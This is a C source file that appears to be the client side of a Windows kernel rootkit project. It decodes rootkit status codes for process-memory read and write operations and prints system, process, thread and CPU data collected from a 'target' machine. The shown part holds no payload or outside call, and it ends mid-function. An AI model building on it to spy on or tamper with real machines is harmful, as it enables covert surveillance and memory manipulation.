#include "rootreqs.h"


/*
==================================================
PARSING DATA AND BUFFERS USED FOR DIFFERENT STUFF:
==================================================
*/


// Parsing ROOTKIT_STATUS return status:
void PrintStatusCode(ROOTKIT_STATUS status_code) {
	switch (status_code) {
	case ROOTKSTATUS_SYSTEMSPC: printf("Operation FAILED - tried to access system memory area of virtual address space\n"); break;
	case ROOTKSTATUS_PRCPEB: printf("Operation FAILED - failed using a required process PEB for the operation\n"); break;
	case ROOTKSTATUS_NOLOADEDDLLS: printf("Operation FAILED - process has no loaded DLLs to get the base of\n"); break;
	case ROOTKSTATUS_OTHER: printf("Operation FAILED - an error occurred that is either general/not included in the other errors\n"); break;
	case ROOTKSTATUS_ADRBUFSIZE: printf("Operation FAILED - impossible (possibly NULL) values for address/es / buffer/s / size/s\n"); break;
	case ROOTKSTATUS_QUERYVIRTMEM: printf("Operation FAILED - a required query of the relevant virtual memory has failed\n"); break;
	case ROOTKSTATUS_INVARGS: printf("Operation FAILED - invalid argument/s were supplied for the operation\n"); break;
	case ROOTKSTATUS_PROTECTIONSTG: printf("Operation FAILED - protection settings of relevant memory stopped the operation\n"); break;
	case ROOTKSTATUS_NOWRITEPRMS: printf("Operation FAILED - could not write to memory because memory is not writeable\n"); break;
	case ROOTKSTATUS_COPYFAIL: printf("Operation FAILED - could not copy memory from one address to another (virtual/physical)\n"); break;
	case ROOTKSTATUS_LESSTHNREQ: printf("Operation OK - operation succeeded but the size written/copied to memory < requested size\n"); break;
	case ROOTKSTATUS_MEMALLOC: printf("Operation FAILED - could not allocate a required memory buffer\n"); break;
	case ROOTKSTATUS_NOTCOMMITTED: printf("Operation FAILED - requested memory area is not committed (not in actual physical memory)\n"); break;
	case ROOTKSTATUS_PROCHANDLE: printf("Operation FAILED - a required process handle could not be achieved by driver\n"); break;
	case ROOTKSTATUS_ACSVIO: printf("Operation FAILED - an access violation occurred while performing the operation\n"); break;
	case ROOTKSTATUS_NOTSUPPORTED: printf("Operation FAILED - status of operation is not supported by machine\n"); break;
	case ROOTKSTATUS_NOTINRELRANGE: printf("Operation FAILED - an address (mainly) / other value was passed that is not in the relative range for the operation\n"); break;
	default: printf("Operation SUCCEES\n");
	}
	printf("\n");
}


// Parsing data and buffers returned from system information requests:
// Different singular functions for each type -

// Copy the data from a certain place in a buffer -
void GetBufferValue(PVOID Src, PVOID Dst, SIZE_T Size) {
	memcpy(Dst, Src, Size);
}


// Parse unexpected error values -
void PrintUnexpected(ROOTKIT_UNEXERR Err) {
	switch (Err) {
	case relevantpid: printf("Unexpected error occurred - medium could not required a PID relevant to the operation\n"); break;

	case memalloc: printf("Unexpected error occurred - medium could not allocate required memory for the operation\n"); break;
	
	case receivedata: printf("Unexpected error occurred - medium could not receive operation information from client\n"); break;
	
	case sendmessage: printf("Unexpected error occurred - medium could not send operation information to client\n"); break;

	case invalidargs: printf("Unexpected error occurred - medium was given invalid arguments from client\n"); break;

	default: printf("Unexpected error DID NOT OCCUR (for now, if more data needs to be received, be ready for additional checks about errors after sending the struct)\n"); break;

	}
}


// Print registry data from target -
void PrintRegistryData(PVOID RegData, ULONG64 EntrySize) {
	SYSTEM_REGISTRY_QUOTA_INFORMATION Regd;
	memcpy(&Regd, RegData, sizeof(SYSTEM_REGISTRY_QUOTA_INFORMATION));
	printf("Registry quota data of target:\n");
	printf("  Registry quota allowed amount ULONG -> %u\n", Regd.RegistryQuotaAllowed);
	printf("  Registry quota used amount ULONG -> %u\n", Regd.RegistryQuotaUsed);
	printf("  Size of a paged pool PVOID -> %llu\n", (ULONG_PTR)Regd.Reserved1);
}


// Print basic information on target -
void PrintBasicSystemInfo(PVOID BasicInfo, ULONG64 EntrySize) {
	ULONG unslong = 0;
	ULONG_PTR unslong_ptr = 0;
	CHAR chr = 0;
	SYSTEM_BASIC_INFORMATION Basicinf;
	memcpy(&Basicinf, BasicInfo, sizeof(SYSTEM_BASIC_INFORMATION));
	printf("Basic system information from target:\n");
	GetBufferValue(Basicinf.Reserved1, &unslong, sizeof(unslong)); printf("  Reserved ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)Basicinf.Reserved1 + 0x04), &unslong, sizeof(unslong));  printf("  Timer resolution ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)Basicinf.Reserved1 + 0x08), &unslong, sizeof(unslong));  printf("  Page size ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)Basicinf.Reserved1 + 0x0C), &unslong, sizeof(unslong));  printf("  Number of physical pages ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)Basicinf.Reserved1 + 0x10), &unslong, sizeof(unslong));  printf("  Lowest physical pages number ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)Basicinf.Reserved1 + 0x14), &unslong, sizeof(unslong));  printf("  Highest physical pages number ULONG -> %u\n", unslong);
	printf("  Allocation granuality of target PVOID -> %llu\n", (ULONG_PTR)Basicinf.Reserved2[0]);
	printf("  Lowest virtual address of UM program PVOID -> %llu\n", (ULONG_PTR)Basicinf.Reserved2[1]);
	printf("  Highest virtual address of UM program PVOID -> %llu\n", (ULONG_PTR)Basicinf.Reserved2[2]);
	printf("  Active processors affinity mask PVOID -> %llu\n", (ULONG_PTR)Basicinf.Reserved2[3]);
	printf("  Number of Processors on target CHAR -> %u\n", Basicinf.NumberOfProcessors);
}


// Print system performance info of target -
void PrintSystemPerformanceInfo(PVOID PerfInfo, BOOL Verbose, ULONG64 EntrySize) {
	LARGE_INTEGER largeint = { 0 };
	ULONG unslong = 0;
	SYSTEM_PERFORMANCE_INFORMATION* SysPerfInf = (SYSTEM_PERFORMANCE_INFORMATION*)PerfInfo;

	printf("System Performance of target:\n");
	GetBufferValue(SysPerfInf->Reserved1, &largeint, sizeof(largeint));  printf("  Idle process time LARGE_INTEGER (actual value is LONGLONG)-> %llu\n", largeint.QuadPart);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x08), &largeint, sizeof(largeint)); printf("  IO read transfer count LARGE_INTEGER (actual value is LONGLONG)-> %llu\n", largeint.QuadPart);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x10), &largeint, sizeof(largeint)); printf("  IO write transfer count LARGE_INTEGER (actual value is LONGLONG)-> %llu\n", largeint.QuadPart);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x18), &largeint, sizeof(largeint)); printf("  IO other transfer count LARGE_INTEGER (actual value is LONGLONG)-> %llu\n", largeint.QuadPart);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x20), &unslong, sizeof(unslong));  printf("  Total number of IO read operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x24), &unslong, sizeof(unslong)); printf("  Total number of IO write operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x28), &unslong, sizeof(unslong)); printf("  Total number of IO other operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x2C), &unslong, sizeof(unslong)); printf("  Total number of available pages ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x30), &unslong, sizeof(unslong)); printf("  Total number of committed pages ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x34), &unslong, sizeof(unslong)); printf("  Limit of committed pages at one time ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x38), &unslong, sizeof(unslong)); printf("  Peak commitment amount ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x3C), &unslong, sizeof(unslong)); printf("  Total number of page faults ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x40), &unslong, sizeof(unslong)); printf("  Total number copy-on-write operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x44), &unslong, sizeof(unslong)); printf("  Total number of transitions ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x48), &unslong, sizeof(unslong)); printf("  Total number of cache transitions ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x4C), &unslong, sizeof(unslong)); printf("  Total number of demand-zero operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x50), &unslong, sizeof(unslong)); printf("  Total number of read operations from a page ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x54), &unslong, sizeof(unslong)); printf("  Total number of IO<->page read operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x58), &unslong, sizeof(unslong)); printf("  Total number of cache read operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x5C), &unslong, sizeof(unslong)); printf("  Total number of cache<->IO operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x60), &unslong, sizeof(unslong)); printf("  Total number of dirty pages write operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x64), &unslong, sizeof(unslong)); printf("  Total number of dirty pages<->IO write operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x68), &unslong, sizeof(unslong)); printf("  Total number of mapped pages write operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x6C), &unslong, sizeof(unslong)); printf("  Total number of mapped pages<->IO write operations ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x70), &unslong, sizeof(unslong)); printf("  Total number of pages that are a part of paged pools ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x74), &unslong, sizeof(unslong)); printf("  Total number of pages that are a part of non-paged pools ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x78), &unslong, sizeof(unslong)); printf("  Total number of allocate operations on paged pools ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x7C), &unslong, sizeof(unslong)); printf("  Total number of free operations on paged pools ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x80), &unslong, sizeof(unslong)); printf("  Total number of allocate operations on non-paged pools ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x84), &unslong, sizeof(unslong)); printf("  Total number of free operations on non-paged pools ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x88), &unslong, sizeof(unslong)); printf("  Total number of free system ptes ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x8C), &unslong, sizeof(unslong)); printf("  Total number of resident system code pages ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x90), &unslong, sizeof(unslong)); printf("  Total number of system driver pages ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x94), &unslong, sizeof(unslong)); printf("  Total number of system code pages ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x98), &unslong, sizeof(unslong)); printf("  Total number of non-paged pool lookaside hits ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x9C), &unslong, sizeof(unslong)); printf("  Total number of paged pool lookaside hits -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xA0), &unslong, sizeof(unslong)); printf("  Total number of available paged pool pages ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xA4), &unslong, sizeof(unslong)); printf("  Total number of resident system cache pages -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xA8), &unslong, sizeof(unslong)); printf("  Total number of resident paged pool pages -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xAC), &unslong, sizeof(unslong)); printf("  Total number of resident system driver pages -> %u\n", unslong);

	if (!Verbose) {
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xB0), &unslong, sizeof(unslong)); printf("  Total number of IO fast read no waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xB4), &unslong, sizeof(unslong)); printf("  Total number of cc fast read waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xB8), &unslong, sizeof(unslong)); printf("  Total number of cc fast read operations that were given unsufficient resources ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xBC), &unslong, sizeof(unslong)); printf("  Total number of cc fast read operations that were not possible ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xC0), &unslong, sizeof(unslong)); printf("  Total number of cc fast module read no waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xC4), &unslong, sizeof(unslong)); printf("  Total number of cc fast module read waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xC8), &unslong, sizeof(unslong)); printf("  Total number of cc fast module read operations that were given unsufficient resources ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xCC), &unslong, sizeof(unslong)); printf("  Total number of cc fast module read operations that were not possible ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xD0), &unslong, sizeof(unslong)); printf("  Total number cc map data no waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xD4), &unslong, sizeof(unslong)); printf("  Total number cc map data waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xD8), &unslong, sizeof(unslong)); printf("  Total number cc map data no wait misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xDC), &unslong, sizeof(unslong)); printf("  Total number cc map data wait misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xE0), &unslong, sizeof(unslong)); printf("  Total number of cc pin mapped data ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xE4), &unslong, sizeof(unslong)); printf("  Total number of cc read pin no waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xE8), &unslong, sizeof(unslong)); printf("  Total number of cc read pin waits -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xEC), &unslong, sizeof(unslong)); printf("  Total number of cc read pin no wait misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xF0), &unslong, sizeof(unslong)); printf("  Total number of cc read pin wait misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xF4), &unslong, sizeof(unslong)); printf("  Total number of cc copy-read no waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xF8), &unslong, sizeof(unslong)); printf("  Total number of cc copy-read waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0xFC), &unslong, sizeof(unslong)); printf("  Total number of cc copy-read no wait misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x100), &unslong, sizeof(unslong)); printf("  Total number of cc copy-read wait misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x104), &unslong, sizeof(unslong)); printf("  Total number of cc read module no waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x108), &unslong, sizeof(unslong)); printf("  Total number of cc read module waits ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x10C), &unslong, sizeof(unslong)); printf("  Total number of cc read module no wait misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x110), &unslong, sizeof(unslong)); printf("  Total number of cc read module wait misses ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x114), &unslong, sizeof(unslong)); printf("  Total number of cc read ahead from IO operations ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x118), &unslong, sizeof(unslong)); printf("  Total number of cc write operations in lazy pages<->IO ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x11C), &unslong, sizeof(unslong)); printf("  Total number of cc write operations in lazy pages ULONG -> %u\n", unslong);
	}

	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x120), &unslong, sizeof(unslong)); printf("  Total number of cc data flushes ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x124), &unslong, sizeof(unslong)); printf("  Total number of cc data pages ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x128), &unslong, sizeof(unslong)); printf("  Total number of context switches ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x12C), &unslong, sizeof(unslong)); printf("  Total number of 1st level tb fills ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x130), &unslong, sizeof(unslong)); printf("  Total number of 2nd level tb fills ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)SysPerfInf->Reserved1 + 0x134), &unslong, sizeof(unslong)); printf("  Total number of system calls ULONG -> %u\n", unslong);
}


// Print time of day on target -
void PrintTimeOfDayInfo(PVOID TimeOfDayInfo, ULONG64 EntrySize) {
	ULONG unslong = 0;
	ULONG64 unslonglong = 0;
	LARGE_INTEGER largeint = { 0 };

	SYSTEM_TIMEOFDAY_INFORMATION* TimeInf = (SYSTEM_TIMEOFDAY_INFORMATION*)TimeOfDayInfo;
	GetBufferValue(TimeInf->Reserved1, &largeint, sizeof(largeint)); printf("  Boot time of target LARGE_INTEGER (actual value is LONGLONG)-> %llu\n", largeint.QuadPart);
	GetBufferValue((PVOID)((ULONG64)TimeInf->Reserved1 + 0x08), &largeint, sizeof(largeint)); printf("  Current time on target LARGE_INTEGER (actual value is LONGLONG)-> %llu\n", largeint.QuadPart);
	GetBufferValue((PVOID)((ULONG64)TimeInf->Reserved1 + 0x10), &largeint, sizeof(largeint)); printf("  Time zone bias of target LARGE_INTEGER (actual value is LONGLONG)-> %llu\n", largeint.QuadPart);
	GetBufferValue((PVOID)((ULONG64)TimeInf->Reserved1 + 0x18), &unslong, sizeof(unslong)); printf("  Time zone id of target ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)TimeInf->Reserved1 + 0x1C), &unslong, sizeof(unslong));  printf("  Reserved ULONG -> %u\n", unslong);
	GetBufferValue((PVOID)((ULONG64)TimeInf->Reserved1 + 0x20), &unslonglong, sizeof(unslonglong));  printf("  Boot time bias of target ULONGLONG -> %llu\n", unslonglong);
	GetBufferValue((PVOID)((ULONG64)TimeInf->Reserved1 + 0x28), &unslonglong, sizeof(unslonglong));  printf("  Sleep time bias of target ULONGLONG -> %llu\n", unslonglong);
}


// Print all working processes on target -
void PrintWorkingProcessesInfo(PVOID CurrentProcInfo, ULONG64 EntrySize) {
	ULONG ProcOffs = 0;
	ULONG ProcCount = 0;
	ULONG ThreadOffs = 0;;
	ULONG unslong = 0;
	ULONGLONG unslonglong = 0;
	LARGE_INTEGER largeint = { 0 };
	SYSTEM_PROCESS_INFORMATION CurrEntry;
	SYSTEM_THREAD_INFORMATION CurrThread;
	memcpy(&CurrEntry, CurrentProcInfo, sizeof(SYSTEM_PROCESS_INFORMATION));

	printf("Working Processes of target:\n");
	while (1 == 1) {
		ProcCount++;

		// Process entry enumeration -
		printf("Process %llu (image name = %wZ) -\n", (ULONG_PTR)CurrEntry.UniqueProcessId, &CurrEntry.ImageName);
		printf("  EXTRA: Entry size ULONG -> %u\n", CurrEntry.NextEntryOffset - ProcOffs);
		printf("  Next entry offset from this one ULONG -> %u\n", CurrEntry.NextEntryOffset);
		printf("  Number of threads ULONG -> %u\n", CurrEntry.NumberOfThreads);
		GetBufferValue(CurrEntry.Reserved1, &largeint, sizeof(largeint));  printf("  Private size of working set LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", largeint.QuadPart);
		GetBufferValue((PVOID)((ULONG64)CurrEntry.Reserved1 + 8), &unslong, sizeof(unslong));  printf("  Hard fault count ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)CurrEntry.Reserved1 + 12), &unslong, sizeof(unslong));  printf("  Number of threads high watermark ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)CurrEntry.Reserved1 + 16), &unslonglong, sizeof(unslonglong));  printf("  Cycle time ULONGLONG -> %llu\n", unslonglong);
		GetBufferValue((PVOID)((ULONG64)CurrEntry.Reserved1 + 24), &largeint, sizeof(largeint));  printf("  Time of creation LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", largeint.QuadPart);
		GetBufferValue((PVOID)((ULONG64)CurrEntry.Reserved1 + 32), &largeint, sizeof(largeint));  printf("  Time of running in usermode LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", largeint.QuadPart);
		GetBufferValue((PVOID)((ULONG64)CurrEntry.Reserved1 + 40), &largeint, sizeof(largeint));  printf("  Time of running in kernel mode LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", largeint.QuadPart);
		printf("  Process base priority LONG -> %lu\n", CurrEntry.BasePriority);
		printf("  Inherited from PID PVOID -> %llu\n", (ULONG_PTR)CurrEntry.Reserved2);
		printf("  Amount of handles ULONG -> %u\n", CurrEntry.HandleCount);
		printf("  Session ID ULONG -> %u\n", CurrEntry.SessionId);
		printf("  Unique process key PVOID -> %llu\n", (ULONG_PTR)CurrEntry.Reserved3);
		printf("  Peak virtual size SIZE_T -> %llu\n", (ULONG64)CurrEntry.PeakVirtualSize);
		printf("  Current virtual size SIZE_T -> %llu\n", (ULONG64)CurrEntry.VirtualSize);
		printf("  Amount of page faults related to process ULONG -> %u\n", CurrEntry.Reserved4);
		printf("  Peak working set size SIZE_T -> %llu\n", (ULONG64)CurrEntry.PeakWorkingSetSize);
		printf("  Current working set size SIZE_T -> %llu\n", (ULONG64)CurrEntry.WorkingSetSize);
		printf("  Peak quota paged pool usage PVOID -> %llu\n", (ULONG_PTR)CurrEntry.Reserved5);
		printf("  Current quota paged pool usage SIZE_T -> %llu\n", (ULONG64)CurrEntry.QuotaPagedPoolUsage);
		printf("  Peak quota non-paged pool usage PVOID -> %llu\n", (ULONG_PTR)CurrEntry.Reserved6);
		printf("  Current quota non-paged pool usage SIZE_T -> %llu\n", (ULONG64)CurrEntry.QuotaPagedPoolUsage);
		printf("  Peak pagefile usages SIZE_T -> %llu\n", (ULONG64)CurrEntry.PeakPagefileUsage);
		printf("  Current pagefile usages SIZE_T -> %llu\n", (ULONG64)CurrEntry.PagefileUsage);
		printf("  Amount of private (reserved) pages SIZE_T -> %llu\n", (ULONG64)CurrEntry.PrivatePageCount);
		printf("  Current working set size SIZE_T -> %llu\n", (ULONG64)CurrEntry.WorkingSetSize);
		printf("  Amount of read operations LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", CurrEntry.Reserved7[0].QuadPart);
		printf("  Amount of write operations LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", CurrEntry.Reserved7[1].QuadPart);
		printf("  Amount of other operations LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", CurrEntry.Reserved7[2].QuadPart);
		printf("  Amount of read transitions LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", CurrEntry.Reserved7[3].QuadPart);
		printf("  Amount of write transitions LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", CurrEntry.Reserved7[4].QuadPart);
		printf("  Amount of other transitions LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", CurrEntry.Reserved7[5].QuadPart);

		// Threads enumeration -
		memcpy(&CurrThread, (PVOID)((ULONG64)CurrentProcInfo + ProcOffs + sizeof(SYSTEM_PROCESS_INFORMATION) + ThreadOffs), sizeof(SYSTEM_THREAD_INFORMATION));
		printf("Threads of process entry (there are %llu threads active in this process currently) -\n", (ULONG64)(CurrEntry.NextEntryOffset - ProcOffs - sizeof(SYSTEM_PROCESS_INFORMATION)) / sizeof(SYSTEM_THREAD_INFORMATION));
		for (int t = 0; t < (CurrEntry.NextEntryOffset - ProcOffs - sizeof(SYSTEM_PROCESS_INFORMATION)) / sizeof(SYSTEM_THREAD_INFORMATION); t++) {
			printf("  Kernelmode time of thread LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", CurrThread.Reserved1[0].QuadPart);
			printf("  Usermode time of thread LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", CurrThread.Reserved1[1].QuadPart);
			printf("  Creation time of thread LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", CurrThread.Reserved1[2].QuadPart);
			printf("  Current waiting time ULONG -> %u\n", CurrThread.Reserved2);
			printf("  Start address of thread PVOID -> %llu\n", (ULONG_PTR)CurrThread.StartAddress);
			printf("  PID of father process of thread PVOID -> %llu\n", (ULONG_PTR)CurrThread.ClientId.UniqueProcess);
			printf("  TID of thread PVOID -> %llu\n", (ULONG_PTR)CurrThread.ClientId.UniqueThread);
			printf("  Thread base priority LONG -> %lu\n", CurrThread.BasePriority);
			printf("  Current thread priority LONG -> %lu\n", CurrThread.Priority);
			printf("  Total amount of context switches of thread ULONG -> %u\n", CurrThread.Reserved3);
			printf("  Thread state ULONG -> %u\n", CurrThread.ThreadState);
			printf("  Wait reason (if the thread is waiting) ULONG -> %u\n", CurrThread.WaitReason);
			ThreadOffs += sizeof(SYSTEM_THREAD_INFORMATION);
			memcpy(&CurrThread, (PVOID)((ULONG64)CurrentProcInfo + ProcOffs + sizeof(SYSTEM_PROCESS_INFORMATION) + ThreadOffs), sizeof(SYSTEM_THREAD_INFORMATION));
		}

		ThreadOffs = 0;
		if (CurrEntry.NextEntryOffset == 0) {
			break;
		}

		ProcOffs += CurrEntry.NextEntryOffset - ProcOffs;
		memcpy(&CurrEntry, (PVOID)((ULONG64)CurrentProcInfo + ProcOffs), sizeof(SYSTEM_PROCESS_INFORMATION));
	}
	printf("TOTAL AMOUNT OF RUNNING PROCESSES WHEN CALLING -> %u\n", ProcCount);
}


// Print cpu performance of target -
void PrintCpuPerformanceInfo(PVOID CpuInf, ULONG64 EntrySize) {
	ULONG ProcssOffs = 0;
	SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION Procssinf;
	printf("CPU Performance of target:\n");
	memcpy(&Procssinf, CpuInf, sizeof(SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION));
	for (int i = 0; i < 8; i++) {
		printf("Processor number %u -\n", i + 1);
		printf("  Total kernelmode processing time of processor LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", Procssinf.KernelTime.QuadPart);
		printf("  Total usermode processing time of processor LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", Procssinf.UserTime.QuadPart);
		printf("  Total idle time of processor LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", Procssinf.IdleTime.QuadPart);
		printf("  Total time of processor interrupts used in processor LARGE_INTEGER (actual value is LONGLONG) -> %llu\n", Procssinf.Reserved1->QuadPart);
		printf("  Total amount of processor interrupts used in processor ULONG -> %u\n", Procssinf.Reserved2);
		ProcssOffs += sizeof(SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION);
		memcpy(&Procssinf, (PVOID)((ULONG64)CpuInf + ProcssOffs), sizeof(SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION));
	}
}


// Print interrupts info of target -
void PrintInterruptInfo(PVOID IntInf, ULONG64 EntrySize) {
	ULONG unslong = 0;
	ULONG IntOffs = 0;
	SYSTEM_INTERRUPT_INFORMATION Sysint;

	printf("Interrupts Data on target:\n");
	memcpy(&Sysint, IntInf, sizeof(SYSTEM_INTERRUPT_INFORMATION));
	for (int i = 0; i < 8; i++) {
		printf("Processor number %u -\n", i + 1);
		GetBufferValue(Sysint.Reserved1, &unslong, sizeof(unslong));  printf("  Total amount context switches while in interrupts ULONG -> %u\n", unslong);
		GetBufferValue((PVOID)((ULONG64)Sysint.Reserved1 + 4), &unslong, sizeof(unslong));  printf("  DPC count ULONG -> %u\n", unslong);
